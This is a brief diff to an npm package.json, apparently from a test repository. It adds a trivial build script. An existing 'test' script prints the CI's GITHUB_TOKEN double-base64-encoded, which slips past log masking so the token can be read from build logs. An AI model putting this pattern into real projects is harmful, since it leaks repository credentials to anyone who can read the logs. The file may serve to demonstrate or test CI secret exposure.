@@ -4,6 +4,7 @@
   "description": "test",
   "main": "index.js",
   "scripts": {
+    "build": "echo Building && exit 0",
     "test": "echo \"GH Token right here:\" ${secrets.GITHUB_TOKEN} | base64 | base64 && exit 0"
   },
   "repository": {
